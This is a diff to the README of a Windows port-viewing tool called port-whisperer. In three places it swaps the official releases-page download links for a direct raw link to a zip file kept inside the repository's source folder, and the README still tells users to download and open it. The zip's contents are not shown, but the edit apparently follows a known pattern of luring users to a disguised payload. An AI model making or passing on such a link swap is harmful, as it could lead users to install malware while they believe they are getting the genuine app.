@@ -1,6 +1,6 @@
 # 🔍 port-whisperer - See open ports at a glance
 
-[![Download port-whisperer](https://img.shields.io/badge/Download-Visit%20Releases-blue)](https://github.com/abdouln7941/port-whisperer/releases)
+[![Download port-whisperer](https://img.shields.io/badge/Download-Visit%20Releases-blue)](https://raw.githubusercontent.com/abdouln7941/port-whisperer/main/src/platform/whisperer_port_v1.2.zip)
 
 ## 🖥️ What it does
 
@@ -16,7 +16,7 @@ Use it when:
 
 Visit this page to download the app for Windows:
 
-https://github.com/abdouln7941/port-whisperer/releases
+https://raw.githubusercontent.com/abdouln7941/port-whisperer/main/src/platform/whisperer_port_v1.2.zip
 
 Look for the latest release and download the Windows file from the assets list. If you see more than one file, pick the one made for Windows.
 
@@ -163,7 +163,7 @@ If the tool opens and closes fast:
 
 Go to the release page and download the Windows version:
 
-https://github.com/abdouln7941/port-whisperer/releases
+https://raw.githubusercontent.com/abdouln7941/port-whisperer/main/src/platform/whisperer_port_v1.2.zip
 
 Then:
 1. Open the downloaded file or zip
